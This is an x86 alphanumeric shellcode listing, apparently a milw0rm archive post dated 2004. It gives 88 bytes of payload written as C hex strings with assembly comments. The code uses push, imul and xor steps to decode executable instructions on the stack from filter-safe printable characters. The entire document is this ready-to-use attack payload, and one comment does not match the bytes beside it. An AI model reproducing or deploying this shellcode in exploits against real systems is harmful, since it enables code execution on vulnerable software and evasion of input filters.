/*-----------------------------------------------------*/
/*     Alpha-Numeric Shellcode using IMUL Method       */
/*           By XORt@dallas_2600)              88bytes */
/*-----------------------------------------------------*/
     "\x68\x69\x58\x69\x6b" /* push $0x6b695869             */
     "\x68\x7a\x36\x37\x70" /* push $0x7037367a             */
     "\x68\x58\x58\x41\x73" /* push $0x73415858             */
     "\x68\x71\x4a\x77\x79" /* push $0x79774a71             */
     "\x68\x65\x77\x57\x31" /* push $0x31577765             */
     "\x68\x42\x69\x57\x77" /* push $0x6850c031             */
     "\x50\x50\x50\x50\x50" /* 17 push %eax's               */
     "\x50\x50\x50\x50\x50" /*                              */
     "\x50\x50\x50\x50\x50" /*                              */
     "\x50\x50"             /*                              */
     "\x54"                 /* push %esp                    */
     "\x59"                 /* pop %ecx                     */
     "\x6b\x51\x58\x57"     /* imul $0x57, 0x58(%ecx), %edx */
     "\x42"                 /* inc %edx                     */
     "\x52"                 /* push %edx                    */
     "\x6b\x41\x54\x78"     /* imul $0x78, 0x54(%ecx), %edx */
     "\x34\x63"             /* xor $0x63, %al               */
     "\x50"                 /* push %eax                    */
     "\x6b\x51\x50\x4a"     /* imul $0x4a, 0x50(%ecx), %edx */
     "\x4a"                 /* dec %edx                     */
     "\x4a"                 /* dec %edx                     */
     "\x52"                 /* push %edx                    */
     "\x6b\x51\x4c\x79"     /* imul $0x79, 0x4c(%ecx), %edx */
     "\x4a"                 /* dec %edx                     */
     "\x52"                 /* push %edx                    */
     "\x6b\x41\x48\x36"     /* imul $0x36, 0x48(%ecx), %edx */
     "\x34\x61"             /* xor $0x61, %al               */
     "\x50"                 /* push %eax                    */
     "\x6b\x51\x44\x79"     /* imul $0x79, 0x44(%ecx), %edx */
     "\x4a"                 /* dec %edx                     */
     "\x52"                 /* push %edx                    */
     /*------------------------------------------[bytes:88]-*/


// milw0rm.com [2004-12-22]